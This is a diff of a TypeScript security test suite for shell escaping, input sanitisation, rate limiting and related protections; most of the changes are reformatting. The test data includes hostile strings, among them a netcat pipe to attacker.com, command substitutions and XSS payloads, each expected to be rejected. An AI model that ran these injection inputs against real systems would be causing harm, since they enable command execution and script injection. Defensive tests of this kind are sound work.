@@ -4,7 +4,8 @@
  */
 
 import { describe, test, expect, beforeEach } from "bun:test";
-import { shellEscapeSingleQuotes } from "./github";
+import { checkVulnerabilities } from "./security";
+import { shellEscapeSingleQuotes as mockShellEscapeSingleQuotes } from "../shell";
 import {
   sanitizeUserPrompt,
   sanitizeThreadId,
@@ -14,56 +15,80 @@ import {
 } from "../sanitize";
 
 describe("Security Tests - Command Injection Prevention", () => {
-  describe("shellEscapeSingleQuotes", () => {
+  describe("mockShellEscapeSingleQuotes", () => {
     test("should reject null bytes", () => {
-      expect(() => shellEscapeSingleQuotes("hello\x00world")).toThrow("null byte");
+      expect(() => mockShellEscapeSingleQuotes("hello\x00world")).toThrow(
+        "null byte",
+      );
     });
 
     test("should reject inputs exceeding 4096 chars", () => {
       const longInput = "a".repeat(4097);
-      expect(() => shellEscapeSingleQuotes(longInput)).toThrow("too long");
+      expect(() => mockShellEscapeSingleQuotes(longInput)).toThrow("too long");
     });
 
     test("should reject command substitution $()", () => {
-      expect(() => shellEscapeSingleQuotes("$(whoami)")).toThrow("dangerous pattern");
+      expect(() => mockShellEscapeSingleQuotes("$(whoami)")).toThrow(
+        "dangerous pattern",
+      );
     });
 
     test("should reject backtick command substitution", () => {
-      expect(() => shellEscapeSingleQuotes("`whoami`")).toThrow("dangerous pattern");
+      expect(() => mockShellEscapeSingleQuotes("`whoami`")).toThrow(
+        "dangerous pattern",
+      );
     });
 
     test("should reject variable substitution ${}", () => {
-      expect(() => shellEscapeSingleQuotes("${HOME}")).toThrow("dangerous pattern");
+      expect(() => mockShellEscapeSingleQuotes("${HOME}")).toThrow(
+        "dangerous pattern",
+      );
     });
 
     test("should reject pipe operators", () => {
-      expect(() => shellEscapeSingleQuotes("cat | nc attacker.com 4444")).toThrow("dangerous pattern");
-      expect(() => shellEscapeSingleQuotes("cat || nc attacker.com 4444")).toThrow("dangerous pattern");
+      expect(() =>
+        mockShellEscapeSingleQuotes("cat | nc attacker.com 4444"),
+      ).toThrow("dangerous pattern");
+      expect(() =>
+        mockShellEscapeSingleQuotes("cat || nc attacker.com 4444"),
+      ).toThrow("dangerous pattern");
     });
 
     test("should reject command chaining", () => {
-      expect(() => shellEscapeSingleQuotes("cmd; malicious")).toThrow("dangerous pattern");
-      expect(() => shellEscapeSingleQuotes("cmd && malicious")).toThrow("dangerous pattern");
+      expect(() => mockShellEscapeSingleQuotes("cmd; malicious")).toThrow(
+        "dangerous pattern",
+      );
+      expect(() => mockShellEscapeSingleQuotes("cmd && malicious")).toThrow(
+        "dangerous pattern",
+      );
     });
 
     test("should reject newline injection", () => {
-      expect(() => shellEscapeSingleQuotes("cmd\nmalicious")).toThrow("dangerous pattern");
-      expect(() => shellEscapeSingleQuotes("cmd\r\nmalicious")).toThrow("dangerous pattern");
+      expect(() => mockShellEscapeSingleQuotes("cmd\nmalicious")).toThrow(
+        "dangerous pattern",
+      );
+      expect(() => mockShellEscapeSingleQuotes("cmd\r\nmalicious")).toThrow(
+        "dangerous pattern",
+      );
     });
 
     test("should reject escaped dollar signs", () => {
-      expect(() => shellEscapeSingleQuotes("cmd \\$malicious")).toThrow("dangerous pattern");
+      expect(() => mockShellEscapeSingleQuotes("cmd \\$malicious")).toThrow(
+        "dangerous pattern",
+      );
     });
 
     test("should safely escape single quotes", () => {
-      const result = shellEscapeSingleQuotes("it's a test");
+      const result = mockShellEscapeSingleQuotes("it's a test");
       expect(result).toBe("'it'\\''s a test'");
     });
 
     test("should handle safe inputs correctly", () => {
-      expect(shellEscapeSingleQuotes("main")).toBe("'main'");
-      expect(shellEscapeSingleQuotes("feature/test-123")).toBe("'feature/test-123'");
-      expect(shellEscapeSingleQuotes("v1.2.3")).toBe("'v1.2.3'");
+      expect(mockShellEscapeSingleQuotes("main")).toBe("'main'");
+      expect(mockShellEscapeSingleQuotes("feature/test-123")).toBe(
+        "'feature/test-123'",
+      );
+      expect(mockShellEscapeSingleQuotes("v1.2.3")).toBe("'v1.2.3'");
     });
   });
 });
@@ -76,7 +101,9 @@ describe("Security Tests - Input Sanitization", () => {
     });
 
     test("should reject null bytes", () => {
-      expect(() => sanitizeUserPrompt("hello\x00world")).toThrow("null byte or control characters");
+      expect(() => sanitizeUserPrompt("hello\x00world")).toThrow(
+        "null byte or control characters",
+      );
     });
 
     test("should reject template injection", () => {
@@ -85,18 +112,30 @@ describe("Security Tests - Input Sanitization", () => {
     });
 
     test("should reject script tags", () => {
-      expect(() => sanitizeUserPrompt("<script>alert('xss')</script>")).toThrow("dangerous pattern");
-      expect(() => sanitizeUserPrompt("<SCRIPT>alert('xss')</SCRIPT>")).toThrow("dangerous pattern");
+      expect(() => sanitizeUserPrompt("<script>alert('xss')</script>")).toThrow(
+        "dangerous pattern",
+      );
+      expect(() => sanitizeUserPrompt("<SCRIPT>alert('xss')</SCRIPT>")).toThrow(
+        "dangerous pattern",
+      );
     });
 
     test("should reject javascript protocol", () => {
-      expect(() => sanitizeUserPrompt("javascript:alert('xss')")).toThrow("dangerous pattern");
-      expect(() => sanitizeUserPrompt("JAVASCRIPT:alert('xss')")).toThrow("dangerous pattern");
+      expect(() => sanitizeUserPrompt("javascript:alert('xss')")).toThrow(
+        "dangerous pattern",
+      );
+      expect(() => sanitizeUserPrompt("JAVASCRIPT:alert('xss')")).toThrow(
+        "dangerous pattern",
+      );
     });
 
     test("should reject event handlers", () => {
-      expect(() => sanitizeUserPrompt("<img onerror=alert('xss')>")).toThrow("dangerous pattern");
-      expect(() => sanitizeUserPrompt("<div ONMOUSEOVER=alert('xss')>")).toThrow("dangerous pattern");
+      expect(() => sanitizeUserPrompt("<img onerror=alert('xss')>")).toThrow(
+        "dangerous pattern",
+      );
+      expect(() =>
+        sanitizeUserPrompt("<div ONMOUSEOVER=alert('xss')>"),
+      ).toThrow("dangerous pattern");
     });
 
     test("should truncate oversized inputs to max limit", () => {
@@ -114,8 +153,12 @@ describe("Security Tests - Input Sanitization", () => {
     });
 
     test("should handle safe inputs", () => {
-      expect(sanitizeUserPrompt("Create a login form")).toBe("Create a login form");
-      expect(sanitizeUserPrompt("Fix the bug in auth.ts")).toBe("Fix the bug in auth.ts");
+      expect(sanitizeUserPrompt("Create a login form")).toBe(
+        "Create a login form",
+      );
+      expect(sanitizeUserPrompt("Fix the bug in auth.ts")).toBe(
+        "Fix the bug in auth.ts",
+      );
     });
   });
 
@@ -127,7 +170,9 @@ describe("Security Tests - Input Sanitization", () => {
 
     test("should accept valid thread IDs", () => {
       expect(sanitizeThreadId("thread-abc123")).toBe("thread-abc123");
-      expect(sanitizeThreadId("user_123_thread_456")).toBe("user_123_thread_456");
+      expect(sanitizeThreadId("user_123_thread_456")).toBe(
+        "user_123_thread_456",
+      );
     });
   });
 
@@ -175,7 +220,9 @@ describe("Security Tests - Input Sanitization", () => {
     });
 
     test("should reject data protocol with script", () => {
-      expect(() => sanitizeUrl("data:text/html,<script>alert('xss')</script>")).toThrow();
+      expect(() =>
+        sanitizeUrl("data:text/html,<script>alert('xss')</script>"),
+      ).toThrow();
     });
 
     test("should reject malformed URLs", () => {
@@ -204,7 +251,7 @@ describe("Security Tests - Rate Limiting", () => {
     for (let i = 0; i < 10; i++) {
       const result = await limiter.checkLimit(
         { ip, threadId, userId, endpoint: "/run" },
-        { perMinute: 10, perHour: 100 }
+        { perMinute: 10, perHour: 100 },
       );
       expect(result.allowed).toBe(true);
     }
@@ -212,7 +259,7 @@ describe("Security Tests - Rate Limiting", () => {
     // 11th request should be rate limited
     const result = await limiter.checkLimit(
       { ip, threadId, userId, endpoint: "/run" },
-      { perMinute: 10, perHour: 100 }
+      { perMinute: 10, perHour: 100 },
     );
     expect(result.allowed).toBe(false);
     expect(result.retryAfter).toBeGreaterThan(0);
@@ -230,21 +277,21 @@ describe("Security Tests - Rate Limiting", () => {
     for (let i = 0; i < 20; i++) {
       await limiter.checkLimit(
         { ip, threadId: thread1, endpoint: "/run" },
-        { perMinute: 100, perHour: 1000, perThread: 20 }
+        { perMinute: 100, perHour: 1000, perThread: 20 },
       );
     }
 
     // thread1 should be rate limited
     let result = await limiter.checkLimit(
       { ip, threadId: thread1, endpoint: "/run" },
-      { perMinute: 100, perHour: 1000, perThread: 20 }
+      { perMinute: 100, perHour: 1000, perThread: 20 },
     );
     expect(result.allowed).toBe(false);
 
     // thread2 should still work
     result = await limiter.checkLimit(
       { ip, threadId: thread2, endpoint: "/run" },
-      { perMinute: 100, perHour: 1000, perThread: 20 }
+      { perMinute: 100, perHour: 1000, perThread: 20 },
     );
     expect(result.allowed).toBe(true);
   });
@@ -259,7 +306,7 @@ describe("Security Tests - Rate Limiting", () => {
     for (let i = 0; i < 5; i++) {
       const result = await limiter.checkLimit(
         { ip, endpoint: "/run" },
-        { perMinute: 10, perHour: 100 }
+        { perMinute: 10, perHour: 100 },
       );
       expect(result.allowed).toBe(true);
       expect(result.remaining).toBe(10 - i - 1);
@@ -293,12 +340,13 @@ describe("Security Tests - Timing Attack Mitigation", () => {
     // Find the authentication section
     const authSection = webappCode.substring(
       webappCode.indexOf("Authentication"),
-      webappCode.indexOf("Authentication") + 2000
+      webappCode.indexOf("Authentication") + 2000,
     );
 
     // Verify that there's no early return pattern like:
     // if (!token) { return c.json(...) }
-    const earlyReturnPattern = /if\s*\(\s*!\s*token\s*\)\s*\{[^}]*return[^}]*\}/;
+    const earlyReturnPattern =
+      /if\s*\(\s*!\s*token\s*\)\s*\{[^}]*return[^}]*\}/;
     expect(authSection).not.toMatch(earlyReturnPattern);
   });
 });
@@ -313,7 +361,9 @@ describe("Security Tests - Message Trimming", () => {
     expect(deepagentsCode).toContain("shouldTrimMessages");
 
     // Verify trimming is integrated after agent execution
-    expect(deepagentsCode).toContain("if (shouldTrimMessages(messages.length))");
+    expect(deepagentsCode).toContain(
+      "if (shouldTrimMessages(messages.length))",
+    );
   });
 
   test("should keep system and last messages", async () => {
@@ -327,7 +377,10 @@ describe("Security Tests - Message Trimming", () => {
 describe("Security Tests - Connection Pooling", () => {
   test("should use undici Agent for connection pooling", async () => {
     const { readFileSync } = require("fs");
-    const supabaseCode = readFileSync("src/memory/supabaseRepoMemory.ts", "utf-8");
+    const supabaseCode = readFileSync(
+      "src/memory/supabaseRepoMemory.ts",
+      "utf-8",
+    );
 
     // Verify Agent is created with proper configuration
     expect(supabaseCode).toContain("new Agent(");
@@ -340,7 +393,10 @@ describe("Security Tests - Connection Pooling", () => {
 
   test("should parallelize independent queries", async () => {
     const { readFileSync } = require("fs");
-    const supabaseCode = readFileSync("src/memory/supabaseRepoMemory.ts", "utf-8");
+    const supabaseCode = readFileSync(
+      "src/memory/supabaseRepoMemory.ts",
+      "utf-8",
+    );
 
     // Verify Promise.all is used for parallel queries
     expect(supabaseCode).toContain("Promise.all");
